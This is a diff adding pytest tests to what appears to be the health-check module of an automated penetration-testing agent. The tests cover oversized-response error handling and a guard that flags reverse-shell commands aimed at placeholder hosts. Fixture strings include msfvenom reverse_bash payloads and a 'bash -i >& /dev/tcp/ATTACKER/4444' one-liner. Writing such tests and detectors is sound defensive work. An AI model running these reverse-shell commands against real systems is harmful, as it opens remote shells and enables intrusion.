@@ -1802,6 +1802,102 @@ def test_repeated_tool_failure_fires():
         mock_trigger.assert_called_once()
 
 
+def test_repeated_tool_failure_client_size_error_is_advisory_not_hir():
+    # aiohttp LineTooLong ("Got more than 8190 bytes") on a RESPONDING target is not a
+    # reachability failure — it must NOT halt the scan with an HIR (the misdiagnosis that fired
+    # 3× on a healthy target during exfiltration-via-header). It surfaces as a non-blocking
+    # advisory instead, and never calls trigger_intervention.
+    with patch("core.session.get_intervention", return_value=None), \
+         patch("core.session.trigger_intervention") as mock_trigger:
+        err = "400, message=\"Got more than 8190 bytes when reading: b'token=eyJ...'\", url='http://t/login'"
+        entries = [{"type": "TOOL", "name": "http_request", "target": "http://t",
+                    "ts": _ts(1), "error": err} for _ in range(3)]
+        alert = _check_repeated_tool_failure(entries)
+        assert alert is not None
+        assert alert["code"] == "TOOL_RESPONSE_TOO_LARGE"
+        assert alert["blocking"] is False
+        assert "not a target-reachability" in alert["message"].lower()
+        mock_trigger.assert_not_called()   # no scan-halting HIR
+
+
+def test_repeated_tool_failure_network_error_still_fires_hir(monkeypatch):
+    # A genuine network-level failure (connection refused / timeout) still gets the reachability HIR.
+    import core.qa_agent as qa_mod
+    monkeypatch.setattr(qa_mod, "_last_hir_trigger_ts", {})   # clear cross-test HIR dedup
+    with patch("core.session.get_intervention", return_value=None), \
+         patch("core.session.trigger_intervention") as mock_trigger:
+        entries = [{"type": "TOOL", "name": "http_request", "target": "http://t", "ts": _ts(1),
+                    "error": "Cannot connect to host t:80 ssl:default [Connection refused]"}
+                   for _ in range(3)]
+        alert = _check_repeated_tool_failure(entries)
+        assert alert["code"] == "HIR_TOOL_FAILURE"
+        mock_trigger.assert_called_once()
+
+
+def test_is_client_response_size_error_classification():
+    from core.qa_agent.checks_health import _is_client_response_size_error as f
+    assert f("Got more than 8190 bytes when reading: b'token=...'")
+    assert f("400, message='Header value is too long'")
+    assert f("aiohttp LineTooLong: ...")
+    assert not f("Cannot connect to host example.com:443 [Connection refused]")
+    assert not f("TimeoutError")
+    assert not f("")
+
+
+# ── reverse-shell placeholder-LHOST guard ────────────────────────────────────
+def _kali_cmd_entry(command, offset_min=1):
+    return {"type": "TOOL", "name": "kali", "command": command, "target": "http://t",
+            "ts": _ts(offset_min)}
+
+
+def test_reverse_shell_placeholder_lhost_advisory():
+    from core.qa_agent.checks_health import _check_reverse_shell_placeholder_lhost as f
+    entries = [_kali_cmd_entry(
+        "msfvenom -p cmd/unix/reverse_bash LHOST=attacker.example.com LPORT=4444 -f raw")]
+    alert = f(entries, {"known_assets": {}})
+    assert alert is not None
+    assert alert["code"] == "REVERSE_SHELL_NO_LHOST"
+    assert alert["blocking"] is False
+    assert "oob_mint" in alert["message"] and "wishlist_add" in alert["message"]
+
+
+def test_reverse_shell_real_operator_lhost_suppresses_advisory():
+    # An operator listener (SMITH_LHOST → known_assets.attacker_host) makes the payload
+    # legitimate — no nag.
+    from core.qa_agent.checks_health import _check_reverse_shell_placeholder_lhost as f
+    entries = [_kali_cmd_entry("msfvenom -p ... LHOST=attacker.example.com LPORT=4444")]
+    sess = {"known_assets": {"attacker_host": {"lhost": "5.6.7.8", "lport": 4444}}}
+    assert f(entries, sess) is None
+
+
+def test_reverse_shell_real_ip_lhost_no_advisory():
+    from core.qa_agent.checks_health import _check_reverse_shell_placeholder_lhost as f
+    entries = [_kali_cmd_entry("msfvenom -p cmd/unix/reverse_bash LHOST=1.2.3.4 LPORT=4444 -f raw")]
+    assert f(entries, {"known_assets": {}}) is None
+
+
+def test_reverse_shell_attacker_prefix_real_host_no_false_positive():
+    # REGRESSION: a genuine hostname that merely STARTS with 'attacker' (attacker.corp.com) must
+    # NOT be flagged — the old loose-substring match ('lhost=attacker') falsely triggered here.
+    from core.qa_agent.checks_health import _check_reverse_shell_placeholder_lhost as f
+    entries = [_kali_cmd_entry("msfvenom -p cmd/unix/reverse_bash LHOST=attacker.corp.com LPORT=4444")]
+    assert f(entries, {"known_assets": {}}) is None
+
+
+def test_reverse_shell_literal_attacker_placeholder_in_devtcp():
+    # The /dev/tcp/ATTACKER/PORT one-liner form is also caught (extracted host token 'attacker').
+    from core.qa_agent.checks_health import _check_reverse_shell_placeholder_lhost as f
+    entries = [_kali_cmd_entry("bash -i >& /dev/tcp/ATTACKER/4444 0>&1")]
+    alert = f(entries, {"known_assets": {}})
+    assert alert is not None and alert["code"] == "REVERSE_SHELL_NO_LHOST"
+
+
+def test_reverse_shell_non_revshell_command_ignored():
+    from core.qa_agent.checks_health import _check_reverse_shell_placeholder_lhost as f
+    entries = [_kali_cmd_entry("nmap -sV -p- attacker.example.com")]   # placeholder host but not a revshell
+    assert f(entries, {"known_assets": {}}) is None
+
+
 # ── _cycle() Telegram notification path ───────────────────────────────────────
 
 @pytest.mark.asyncio
